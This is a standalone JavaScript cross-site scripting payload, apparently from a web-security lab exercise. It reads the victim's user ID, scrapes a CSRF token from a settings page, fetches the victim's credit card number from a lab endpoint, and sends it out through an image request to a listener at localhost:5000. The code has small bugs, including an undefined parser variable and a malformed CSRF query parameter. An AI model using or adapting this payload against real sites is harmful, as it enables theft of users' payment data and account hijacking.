<script>
 var xhr = new XMLHttpRequest();
 var xhr1 = new XMLHttpRequest();
 var csrf_token = '';
 var link = document.getElementById('settings');

 xhr1.onreadystatechange = function() {
   if(xhr1.readyState == 4 && xhr1.status == 200) {
	var parser1 = new DOMParser(); 
	htmlDoc1 = parser.parseFromString(xhr1.responseText, 'text/html');
        cc = htmlDoc1.getElementById('result').innerHTML;
	document.getElementById('result').innerHTML;
	new Image().src = 'http://localhost:5000/?cc='+cc;
   }
 };

 xhr.onreadystatechange = function() {
   if(xhr.readyState == 4 && xhr.status == 200) {
	var parser = new DOMParser();
	htmlDoc = parser.parseFromString(xhr.responseText, 'text/html');
	csrf_token = htmlDoc.forms[0].elements[1].value;
	xhr1.open('GET', '/lab/webapp/jfp/19/getcreditcard?uid='+uid+'&csrf_token'+csrf_token, true);
	xhr1.send();
   }
 };

 var uid = link.innerHTML.split(':')[1];
 xhr.open('GET', link.href, true);
 xhr.send('');
</script>
